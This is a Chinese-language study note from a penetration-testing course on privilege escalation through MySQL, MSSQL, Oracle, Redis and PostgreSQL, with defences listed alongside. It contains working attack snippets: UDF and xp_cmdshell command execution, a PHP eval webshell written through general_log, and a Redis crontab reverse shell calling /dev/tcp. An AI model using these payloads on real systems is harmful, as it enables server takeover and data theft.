# 2026-08-28 权限提升③：数据库提权（MySQL / MSSQL / Oracle / Redis / PostgreSQL 五大库）

> 状态：🧪 理论（课程导图 + 案例截图），待实操
> 小迪安全《提权》第三课，也是 08-26 Windows 提权笔记里「数据库提权（案例2）」的完整展开。核心素材：**数据库提权总导图**（五大库分支）+ 三个案例截图（Redis 提权 / PostgreSQL 提权 / MySQL UDF 演示 / Windows 令牌窃取）。导图分支：**Mysql**（UDF/MOF/启动项/反弹shell）、**Mssql**（xp_cmdshell/sp_oacreate/sp_oamethod/沙盒模式/映像劫持）、**Oracle**（普通用户/DBA用户/注入模式）、**Redis**（计划任务反弹shell/写ssh公钥/低权限写webshell）、**Postgresql**（CVE-2018-1058/CVE-2019-9193）。

## 一、一句话认知

**数据库提权 = 手里已有数据库连接/权限（弱口令、SQL 注入、配置文件泄露拿到），利用数据库自身的功能点或漏洞，执行系统命令 / 写文件，把「数据库权限」升级成「服务器系统权限」。**

> 放在整条渗透线里：信息收集 → 拿入口 → **提权** → 内网/后渗透。数据库提权是 08-25「提权概述」里 **②其他权限-数据库** 分支的落地——拿到数据库凭据后，怎么从"能操作数据库"变成"能操作服务器"。
>
> 类比：数据库服务像一个"特权员工"，它的系统权限取决于**以什么账号运行**（root/system 还是低权限）。提权就是利用数据库的功能缺口，让这个员工替我们干系统级的活。

## 二、共性前提与判断（什么时候走数据库提权）

**先判断手里有什么，再选路线**（08-25 概述的三类入口）：

| 我手里有什么 | 走哪条提权路 |
|------------|------------|
| 只有数据库连接（弱口令/注入/配置文件泄露） | **数据库提权**（本篇）——数据库本身能执行命令/写文件，直接冲系统权限 |
| 已是低权限系统用户（webshell/普通账户） | 优先**系统提权**（08-26 补丁筛选/at/sc/ps、SUID、内核溢出），数据库提权作为补充 |
| 两者都有 | 选最容易的一条，数据库提权常比内核溢出省事（不用等补丁匹配） |

**数据库提权的共同前提**（缺一不可，判断顺序）：

1. **连接上了**：服务探针（端口 3306/1433/1521/6379/5432 + 指纹）→ 口令获取 → 连接。**口令获取途径**（MySQL 为例）：3306 弱口令爆破 / sqlmap 注入的 `--sql-shell` 模式 / 网站配置文件明文密码（`config.php` 等）/ **CVE-2012-2122 认证绕过**（MySQL/MariaDB 密码比较缺陷，约 256 次尝试蒙对一次，受影响版本 5.1.63、5.5.24、5.6.6 之前；MSF 模块 `auxiliary/scanner/mysql/mysql_authbypass_hashdump`，或 bash 循环 `for i in seq 1 1000; do mysql -u root --password=bad ...; done`）
2. **信息收集**（MySQL 演示课给的流程：服务探针 → 信息收集 → 提权利用 → 获取权限）：
   - 读网站数据库配置文件 → 了解命名规则与查找技巧（`sql` / `data` / `inc` / `config` / `conn` / `database` / `common` / `include` 等关键词）
   - 读数据库存储/备份文件 → 了解存储格式与内容（`@@basedir/data/数据库名/表名.myd`）
   - 暴力猜解 → 了解数据库是否支持外联、如何开启外联（远程/本地两种猜解位置）
3. **数据库进程权限够高**：MySQL/Oracle/Redis 以 root（Linux）或 SYSTEM（Windows）运行才有意义；MSSQL 默认服务账户权限通常也够（NETWORK SERVICE）
4. **功能点开放**：FILE 权限、plugin 目录可写、xp_cmdshell 未禁、COPY 可用……

## 三、MySQL 提权（4 种）

### 1. UDF 提权 ⭐（最经典，课上有演示流程）

- **原理**：MySQL 支持加载**自定义函数 UDF（User Defined Function）**——把编译好的共享库（Windows 是 `.dll`，Linux 是 `.so`）放进 plugin 目录，`CREATE FUNCTION` 注册成 `sys_exec` / `sys_eval` / `do_system` 这类**命令执行函数**，`SELECT sys_exec('whoami')` 直接执行系统命令，权限 = MySQL 进程权限（root/system）。
- **前提**：① 有 FILE 权限（能写文件）② `@@plugin_dir` 目录可写 ③ MySQL 以高权限运行 ④ 能 `CREATE FUNCTION`。MySQL ≤5.5 最顺手；5.6+ 默认 `secure_file_priv` 限制写文件，得先解决"怎么把 dll 弄进 plugin 目录"。
- **演示课的信息收集四步**（截图 2）：
  1. 读网站数据库配置文件（命名规则：`sql data inc config conn database common include` 等）→ 拿数据库连接凭据
  2. 读数据库存储/备份文件（存储格式：`@@basedir/data/数据库名/表名.myd`）→ 了解库结构/敏感数据
  3. 暴力猜解（远程本地 / 服务器本地）→ 确认能否外联，为后续利用铺路
  4. **导出自定义执行函数 dll → 命令执行**（核心一步：UDF 库落地 + 注册 + 调用）
- **利用链**：拿连接 → 确认版本/权限/plugin 路径 → 把 udf.dll/so 写入 plugin 目录 → `CREATE FUNCTION` 注册 → `SELECT sys_exec('命令')` → 反弹 shell 或直接操作
- **版本/路径细节**（查证补充）：MySQL **<5.1** 导出到 `c:/windows` 或 `system32`；**>=5.1** 导出到 `lib/plugin/`（plugin 目录默认不存在，需手动创建或 NTFS 流创建）。sqlmap 自带现成 udf 库（`data/udf/mysql/`，分 win/linux + 32/64 位），但为过杀软做了 cloak 编码，需用 `extra/cloak` 的 `cloak.py -d` 解码；MSF 模块 `exploit/multi/mysql/mysql_udf_payload` 可一键写入 dll 并注册 `sys_exec()`（无回显，可手动 `create function sys_eval returns string soname 'xxx.dll'` 拿有回显版）
- **防御**：MySQL 用低权限账号运行（绝不用 root/system）、不随便给 FILE 权限、plugin 目录只读、`secure_file_priv` 限制导入导出

> 💡 **secure_file_priv 三个取值**：`NULL` = 禁止导入导出（5.5 之后默认）；`/` = 仅限该目录；`空` = 不限制（5.5 之前默认）。5.5+ 默认 NULL，所以老文章里的 `into outfile` 写 shell 现在基本失效——想放开要在 `my.ini` 加 `secure_file_priv=` 重启，或走下面的**日志写 shell**。

### 1.5 日志写 shell（general_log，secure_file_priv 被限制时的替代）

- **原理**：MySQL 的 `general_log`（通用查询日志）默认关闭，高权限用户可开启，并把日志文件路径 `general_log_file` 改成任意位置——之后**每条 SQL 都会原样写进日志文件**，往日志里塞一句 `select '<?php @eval($_POST[x]);?>'` 就等于写了一个 php webshell。
- **命令**：`set global general_log = "ON";` + `set global general_log_file='c:/phpstudy_pro/www/shell.php';` + `select "<?php ...?>";`
- **适用**：MySQL 5.0+，高权限 + 知道网站物理路径 + 目录可写（比 UDF 门槛低，不需要 plugin 目录/编译 dll）。

### 2. MOF 提权（Windows 老版本）

- **原理**：Windows 的 WMI 会**自动编译执行** `C:\WINDOWS\system32\wbem\mof\` 目录下的 `.mof` 文件。用 MySQL 的 FILE 权限把写好的 `nullevt.mof`（里面嵌着要执行的命令）dumpfile 到该目录 → 几秒内被系统以 SYSTEM 权限执行。
- **前提**：Windows + MySQL FILE 权限 + 老系统（Win7 后 mof 目录权限收紧，基本失效）。
- **防御**：升级系统、限制 FILE 权限。

### 3. 启动项提权（Windows）

- **原理**：FILE 权限写 `.bat` / `.vbs` 到**启动目录**（如 `C:\Documents and Settings\All Users\「开始」菜单\程序\启动\`）→ 等管理员登录/服务器重启时，脚本以管理员权限自动执行。
- **特点**：**非即时生效**（要等人登录/重启），适合持久化或确认管理员会登录的场景。
- **防御**：限制 FILE 权限、启动目录加 ACL。

### 4. 反弹 shell

- 导图里的「反弹 shell」不是独立手法，而是上面几种手段的**落地形态**：UDF 拿到命令执行后，直接跑 `bash -i >& /dev/tcp/攻击机IP/端口 0>&1` 之类回连；或写 Linux 计划任务（crontab）/Windows 启动项间接反弹。
- 本质一句话：**先让数据库"能执行命令"，再把命令换成反弹 shell**。

## 四、MSSQL 提权（5 种）

> MSSQL 的提权核心是 **sa（系统管理员）权限 + 扩展存储过程/功能点**。拿 sa 的途径：弱口令、SQL 注入（堆叠注入）、配置泄露。执行身份 = SQL Server 服务账户。

### 1. xp_cmdshell ⭐（最经典）

- **原理**：MSSQL 内置扩展存储过程 `xp_cmdshell` 直接执行系统命令并返回结果。
- **前提**：sa 权限；默认**禁用**，需先开启（关键序列，2005+ 通用）：
  ```
  EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
  EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
  EXEC xp_cmdshell 'whoami';
  ```
- **踩坑补充**：xp_cmdshell 若被管理员删除，可上传/恢复 `xplog70.dll` 再用 `exec master.sys.sp_addextendedproc 'xp_cmdshell', 'C:\Program Files\Microsoft SQL Server\MSSQL\Binn\xplog70.dll'` 加回来。
- **防御**：保持禁用、sa 强密码、服务用低权限账号跑。

### 2. sp_oacreate + sp_oamethod（OLE 自动化，绕过禁用的 xp_cmdshell）

- **原理**：xp_cmdshell 被禁时换一条路——用 OLE Automation 存储过程创建 **WScript.Shell** COM 对象，`sp_oamethod` 调它的 `.run` 方法执行命令：
  ```
  EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;
  DECLARE @s INT;
  EXEC sp_oacreate 'wscript.shell', @s OUT;
  EXEC sp_oamethod @s, 'run', NULL, 'cmd /c whoami > c:\1.txt';
  ```
- **关系**：`sp_oacreate` 负责"创建对象"，`sp_oamethod` 负责"调用对象方法"——导图里两个节点是一对组合拳。
- **防御**：禁用 OLE Automation Procedures。

### 3. 沙盒模式（Sandbox Mode，老版本）

- **原理链**（查证补充）：**Access 可以调用 VBS 函数以 System 权限执行任意命令**，但有个"开关"默认关闭——这个开关在**注册表**里。而 SA 有写注册表的权限（`xp_regwrite`）→ SA 先用 xp_regwrite 打开开关 → 再通过 **Ad Hoc Distributed Queries + OpenRowSet** 调用 JET 引擎（`Microsoft.Jet.OLEDB.4.0`）执行 Access 里的命令方法 → 以 System 权限执行任意命令。
- **前提**：sa + SQL Server 2000/2005（2008+ JET 限制，基本失效）+ 目标机存在 `ias.mdb` / `dnary.mdb` 等 JET 数据源文件。
- **防御**：升级、禁用 Ad Hoc Distributed Queries、限制 xp_regwrite。

### 4. 映像劫持（IFEO，注册表类）

- **原理**：写注册表 `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\<程序名>\Debugger` 为恶意程序路径 → 当 `<程序名>` 启动时，Windows 先启动 Debugger 指定的程序（以同样的权限）。
- **MSSQL 版**：sa + `xp_regwrite` 写注册表实现。经典组合是劫持 `sethc.exe`（粘滞键）这类系统程序，在登录界面触发 SYSTEM 权限命令；也可劫持管理员会启动的程序做提权/持久化。
- **防御**：限制 xp_regwrite、监控 IFEO 注册表键变更。

## 五、Oracle 提权（3 种场景）

> ⭐ 2026-08-28 补充：查证了公开资料（博客园 micr067/卿先生 + 腾讯云小迪课笔记），三模式具体手法如下。核心原理一句话：**PL/SQL 有「定义者权限」和「调用者权限」两种执行模式——定义者权限的过程无论谁调用，执行权限都是定义者的**。所以高权限用户（SYS）定义并授权 PUBLIC 调用的包/过程里一旦有 SQL 注入点，低权限用户就能借道以 SYS 身份执行任意代码 → 提权。Oracle 历史提权漏洞几乎都集中在 PL/SQL 函数/存储过程/包/触发器中。

| 场景 | 前提 | 手法链 | 回显 |
|------|------|--------|------|
| **普通用户模式** | 只有普通连接账号（如仅 CREATE SESSION），无 DBA | **PL/SQL 注入打 SYS 包**（老版本）：`DBMS_EXPORT_EXTENSION` 的三个函数（get_domain_index_tables 等）以 SYS 权限定义且 PUBLIC 可调用，内部有 PL/SQL 注入 → 构造 Payload 借道执行 `GRANT DBA TO PUBLIC` 或直接建 Java 库执行命令。影响 8.1.7.4~10.2.0.2（2006-07 CPU 修复）；同类还有 `dbms_xmlquery.newcontext()`。**另一条路：给自己授予 Java 权限**——用 `DBMS_JVM_EXP_PERMS.IMPORT_JVM_PERMS` 给当前用户授 `java.io.FilePermission` + `java.lang.RuntimePermission`，再创建 Java 类（`Runtime.getRuntime().exec`）→ 函数/存储过程包装 → `select LinxRunCMD('whoami') from dual` | 有 |
| **DBA 用户模式** | 已是 DBA（库内最高权限） | 直接用库功能执行系统命令：① **Java 存储过程**（标准做法：`CREATE JAVA SOURCE` 写 `Runtime.exec` → `CREATE PROCEDURE` 包装 → `exec 过程('net user ...')`，命令身份 = oracle 进程用户）② **DBMS_SCHEDULER** 创建 PROGRAM 类型为 EXECUTABLE 的作业跑命令 ③ `UTL_FILE` 写文件 ④ `CREATE LIBRARY` + extproc 外部过程加载恶意 .so/.dll（最强）| 有 |
| **注入提升模式** | 有一个 Oracle SQL 注入点 | sqlmap 一把梭（`--is-dba` 判断、`--os-shell` 尝试）；或 MSF 模块 `auxiliary/sqli/oracle/dbms_cdc_subscribe.activate_subscription` 注入 `grant dba to 用户`。若注入用户是普通用户 → 先走普通用户模式的 PL/SQL 链提到 DBA | **无**（注入模式执行命令通常没回显，要结合带外/写文件确认） |

- 工具：`jas502n/oracleshell`（GitHub，普通用户/DBA 模式自动化）
- **为什么实战中 Oracle 基本不提权**（这是我记忆里"不能提权"的来源）：① 经典 PL/SQL 注入漏洞都是 2006 年前后的老洞，现代生产库基本打不动 ② 命令执行链长且苛刻（Java 权限/过程权限/extproc 配置，缺一环就卡死）③ 注入模式无回显 ④ Oracle 多在银行/政务等核心系统，版本新、加固好、有专职 DBA——**实战拿到 Oracle 基本都是脱库，提权少见**

## 六、Redis 提权（案例 1 截图，导图三分支齐全）

- **原理**：Redis 服务**配置不当**（未授权访问：6379 默认无密码 / bind 到所有网卡）+ **以 root 身份运行** → 攻击者用内置命令就能把**任意内容写成任意路径文件**（利用 RDB 持久化 `CONFIG SET dir/dbfilename` + `SAVE`），再把文件变成代码执行/登录手段；顺手还能 `FLUSHALL` 清空数据。
- **连接方式**：未授权直连（无密码）或弱口令。
- **三种利用**（导图 + 截图一致）：
  1. **计划任务反弹 shell**（Linux）：把 crontab 内容写进 `/var/spool/cron/` 对应文件 → root 定时执行反弹命令。命令序列：`set x "\n* * * * * bash -i >& /dev/tcp/IP/端口 0>&1\n"` → `config set dir /var/spool/cron/` → `config set dbfilename root` → `save`。⚠️ 踩坑：RDB 文件有序列化头尾，命令前后要加**换行和注释符**包裹，否则 crontab 解析失败
  2. **写 SSH 公钥登录**：把攻击机公钥写进 `/root/.ssh/authorized_keys` → 用私钥直接 SSH 登录（需目标开 SSH）
  3. **低权限往 web 物理路径写 webshell**：`dir` 设为网站根目录、`dbfilename` 设为 `.php` → 写入恶意代码 → 访问即得 webshell（权限不够写系统文件时的选择）
- **修复方案**（截图 1 原文要点，⚠️ 均需**重启 Redis** 才生效）：
  1. **绑定 IP**：只 bind 需要访问数据库的 IP（默认 `127.0.0.1` 太死、`0.0.0.0` 太松，改成实际业务需要的地址）
  2. **设置访问密码**：`redis.conf` 的 `requirepass` 字段加访问密码
  3. **低权限运行**：用较低权限账号运行 Redis 服务，并**禁用该账号的登录权限**
  - 补充防御：`rename-command` 禁用 CONFIG/EVAL 等危险命令、防火墙只放行业务网段

## 七、PostgreSQL 提权（案例 2 截图）

- **原理**：PostgreSQL 9.3~11 版本里存在"特性"，管理员或具有 **`COPY TO/FROM PROGRAM`** 权限的用户可以**执行任意系统命令**（本质是 COPY 功能被滥用，官方以 CVE-2019-9193 定性）。
- **利用流程**：连接（弱口令，如 vulhub 环境 postgres/postgres）→ 利用漏洞 → 执行命令 → 提权：
  ```
  COPY cmd FROM PROGRAM 'id';   -- 直接以 PG 进程身份执行系统命令
  ```
- **另一个漏洞 CVE-2018-1058**（PG 9.0~10）：**search_path 劫持**——攻击者能在库里建对象时，创建与常用函数**同名/同签名**的恶意函数，利用 PostgreSQL 的 schema 搜索顺序（`pg_temp` 优先），诱导高权限用户执行查询时**实际调用到恶意函数**，以高权限上下文执行任意 SQL/代码。**vulhub 的完整利用链**：普通用户（vulhub:vulhub）登录 → **普通用户植入后门命令**（建恶意函数/对象）→ **管理员操作数据库触发** → 成功反弹 shell。
- **修复方案**：升级版本或打补丁。
- **复现环境**：vulhub `postgres` 目录（本机 `C:/Users/huoyuchen/vulhub` 有整套环境）。

## 八、补充案例：Windows 2008/7 令牌窃取提权（本地，截图 1 案例 3）

> 不属于数据库提权，是 Windows 本地提权，课程案例顺带讲的，补进来凑成完整记录（承接 08-26 Windows 提权）。

- **原理**：进行**远程过程调用（RPC）时请求提升权限**，系统生成**特权安全令牌**以执行特权操作。当系统允许该令牌不仅用于进程本身、还用于**原始请求进程**时，漏洞就出现了——攻击者能窃取高权限令牌冒充执行。
- **影响范围**：老系统（Microsoft Windows XP Professional SP3 及之前 / 2000 / 2003）。
- **本地提权实验流程**：获取会话 → 利用模块 → 窃取令牌 → 提权。工具/模块：`churrasco.exe`（Token Kidnapping）或 MSF 的 **incognito**（`use incognito` → `list_tokens -u` → `impersonate_token 'NT AUTHORITY\SYSTEM'`）。
- **防御**：升级系统（现代 Windows 已修复令牌管理）。

## 九、总结：五大库提权速查表

| 数据库 | 手段 | 核心前提 | 平台 |
|--------|------|---------|------|
| **MySQL** | UDF | FILE 权限 + plugin 目录可写 + 高权限进程 | Linux/Windows |
| | MOF | FILE 权限 + 老 Windows（mof 目录可写） | Windows 老版本 |
| | 启动项 | FILE 权限 + 启动目录可写 + 等登录 | Windows |
| | 反弹 shell | 上面任意一种拿到命令执行后回连 | 通用 |
| **MSSQL** | xp_cmdshell | sa + 开启扩展存储过程 | Windows |
| | sp_oacreate/oamethod | sa + OLE Automation（xp_cmdshell 被禁时绕） | Windows |
| | 沙盒模式 | sa + 2000/2005 老版本 + JET 文件 | Windows 老版本 |
| | 映像劫持 | sa + xp_regwrite 写 IFEO 注册表 | Windows |
| **Oracle** | 普通用户/DBA/注入 | 看手里权限；DBA 可直接执行命令 | Linux/Windows |
| **Redis** | 计划任务/ssh公钥/webshell | 未授权访问 + root 运行 + 任意文件写 | Linux 为主 |
| **PostgreSQL** | COPY FROM PROGRAM / search_path | 弱口令连接 + 9.3~11（或 9.0~10） | Linux |

**一句话记忆**：MySQL 靠"写文件"（UDF/MOF/启动项）、MSSQL 靠"内置功能"（xp_cmdshell/OLE/注册表）、Redis 靠"任意文件写"、PostgreSQL 靠"COPY 特性"、Oracle 靠"包与存储过程"。共同本质 = **数据库服务进程权限高 + 某个功能点越权给了系统级能力**。

## 疑问

1. ❓ UDF 提权在 MySQL 5.6+（`secure_file_priv` 默认限制写文件）下，udf.dll 怎么进 plugin 目录？必须配合 webshell/其他写文件手段，还是有绕过？
2. ❓ MOF 提权在现代 Windows（Win7+）是否完全失效？mof 目录权限具体怎么限制的？
3. ❓ MSSQL 沙盒模式提权的完整操作链？（原理链已懂，但 OpenRowSet 具体语句还没跑通验证）
4. ❓ CVE-2018-1058（search_path 劫持）里"普通用户植入后门命令"具体建的是什么恶意对象？（函数？触发器？）怎么保证管理员一定触发？
5. ❓ 令牌窃取（churrasco / MSF incognito）在现代 Windows 上还有效吗？还是已完全修复？
6. ❓ Oracle 注入模式下 sqlmap `--os-shell` 具体怎么用的？（无回显时怎么判断命令是否执行成功？）

## 关联笔记

- [2026-08-25(续3)-权限提升概述.md](./2026-08-25(续3)-权限提升概述.md) — 提权概述：本课是「②其他权限-数据库」分支的完整落地
- [2026-08-26-Windows提权-补丁筛选与at-sc-ps提权.md](./2026-08-26-Windows提权-补丁筛选与at-sc-ps提权.md) — 本课回答其中「数据库提权（案例2）」的具体利用条件；Windows 命令类提权是姊妹篇
- [2026-07-27-高权限注入与文件操作.md](./2026-07-27-高权限注入与文件操作.md) — SQL 注入视角的数据库权限（into outfile / load_file 是 MySQL 写文件的基础）
- [2026-08-15-DC1靶机渗透实战.md](./2026-08-15-DC1靶机渗透实战.md) — 实战里 MySQL 弱口令 → 数据库 → hashcat 破 root 密码的真实链路

## 待实践

- vulhub 复现：`postgres`（CVE-2018-1058 普通用户植入后门→管理员触发 + CVE-2019-9193 COPY）+ `redis`（三种写文件姿势）环境都现成
- 本地搭 MySQL 5.5/5.7 试 UDF（注意 secure_file_priv 影响）+ general_log 日志写 shell
- Oracle：本地装个 Oracle XE 试 oracleshell 工具的普通用户模式（PL/SQL 注入链），验证 DBMS_JVM_EXP_PERMS 授权 + Java 存储过程命令执行
- 看课程视频核对 Oracle 三模式和导图节点对应关系

> ⚠️ 声明：仅限授权环境（靶场/CTF/授权渗透）中测试，所有 Payload 只用于验证漏洞存在。
